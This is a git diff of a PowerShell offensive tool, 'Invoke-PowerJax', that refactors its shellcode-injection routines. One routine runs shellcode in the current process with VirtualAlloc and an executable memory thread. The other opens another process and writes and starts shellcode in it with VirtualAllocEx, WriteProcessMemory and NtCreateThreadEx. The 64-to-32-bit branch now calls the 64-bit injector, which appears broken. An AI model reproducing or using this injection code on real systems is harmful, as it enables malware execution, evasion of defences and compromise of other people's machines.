@@ -350,9 +350,8 @@ function Invoke-PowerJax{
     $kernel32 = $Types['kernel32']
     $ntdll = $Types['ntdll']
 
-    #If the process id is not given, inject into the current ps process 
-    If(-not $ProcID){
-        #If the current ps process is 32 bit
+
+    function Invoke-InjectShellcodeLocal{
         if($script:CurrProcArc -eq 32){
             $SizePtr = ([System.Runtime.InteropServices.Marshal]::AllocHGlobal($global:buf.Length)) #copy our shellcode size to an IntPtr
             $baseAddress = $kernel32::VirtualAlloc(0, $SizePtr, 0x3000, 0x40) #Call VirtualAlloc to allocate memory in the current process
@@ -372,6 +371,33 @@ function Invoke-PowerJax{
             Write-Verbose "Started a thread at address : $baseAddress"
             $Result = $kernel32::WaitForSingleObject($ThrHandle, 0xFFFFFFFF)
         }
+
+    }
+    function Invoke-InjectShellcodeRemote{
+        param(
+            [IntPtr]$ProcessHandle = [IntPtr]::Zero
+        )
+
+        If($ProcessHandle -eq [IntPtr]::Zero){
+            Throw "Did not obtain ProcessHandle"
+        }
+
+        $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf64.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
+        Write-Verbose "$baseAddress"
+        [IntPtr]$bytesWritten = 0
+        $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf64, $global:buf64.Length, $bytesWritten) #Copy the shellcode to the remote process 
+        Write-Verbose "$WriteResult"
+        [IntPtr]$ArgPtr = [IntPtr]::Zero
+        [IntPtr]$ThreadHandle = [IntPtr]::Zero
+        $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
+        Write-Verbose "Created remote thread at address : $baseAddress"
+
+    }
+
+    #If the process id is not given, inject into the current ps process 
+    If(-not $ProcID){
+        #If the current ps process is 32 bit
+        Invoke-InjectShellcodeLocal
     }
     else{
         if($script:OSbitness -eq 64){
@@ -382,16 +408,7 @@ function Invoke-PowerJax{
             $Result = $kernel32::IsWow64Process($ProcessHandle, [ref]$IsWow64) #Check if the process is a Wow64 process
             Write-Verbose "IsWow64Process ? $Result"
             if(($IsWow64 -eq $false) -and ($script:CurrProcArc -eq 64)){
-                $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf64.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
-                Write-Verbose "$baseAddress"
-                [IntPtr]$bytesWritten = 0
-                $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf64, $global:buf64.Length, $bytesWritten) #Copy the shellcode to the remote process 
-                Write-Verbose "$WriteResult"
-                [IntPtr]$ArgPtr = [IntPtr]::Zero
-                [IntPtr]$ThreadHandle = [IntPtr]::Zero
-                $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
-                Write-Verbose "Created remote thread at address : $baseAddress"
-                #$result = $kernel32::CloseHandle($ThreadHandle)
+                Invoke-InjectShellcodeRemote($ProcessHandle)
             }
             elseif(($IsWow64 -eq $False) -and ($script:CurrProcArc -eq 32)){
                 Write-Verbose "Cannot inject shellcode from 32 -> 64"
@@ -399,34 +416,17 @@ function Invoke-PowerJax{
                 break
             }
             elseif(($IsWow64) -and ($script:CurrProcArc -eq 32)){
-                $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process
-                Write-Verbose "$baseAddress" 
-                [IntPtr]$bytesWritten = 0
-                $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf, $global:buf.Length, $bytesWritten) #Copy the shellcode to the remote process
-                Write-Verbose "$WriteResult"
-                [IntPtr]$ArgPtr = [IntPtr]::Zero
-                [IntPtr]$ThreadHandle = [IntPtr]::Zero
-                $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
-                #$result = $kernel32::CloseHandle($ThreadHandle)
+                Invoke-InjectShellcodeRemote($ProcessHandle)
             }
             else{
-                Write-Verbose "Cannot Inject shellcode from 64 -> 32"
-                #Cross architecture injection coming soon
+                Invoke-InjectShellcodeRemote($ProcessHandle)
+                #64 -> 32
             }
 
         }
         else {
             $ProcessHandle = $kernel32::OpenProcess(0x001F0FFF, $False, $ProcID) #Obtain a handle to the remote process 
-            Write-Verbose "$ProcessHandle"
-            $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
-            Write-Verbose "$baseAddress"
-            [IntPtr]$bytesWritten = 0
-            $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf, $global:buf.Length, $bytesWritten) #Copy shellcode to remote process 
-            Write-Verbose "$WriteResult"
-            [IntPtr]$ArgPtr = [IntPtr]::Zero
-            [IntPtr]$ThreadHandle = [IntPtr]::Zero
-            $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
-            #$result = $kernel32::CloseHandle($ThreadHandle)
+            Invoke-InjectShellcodeRemote($ProcessHandle)
         }
     }
         
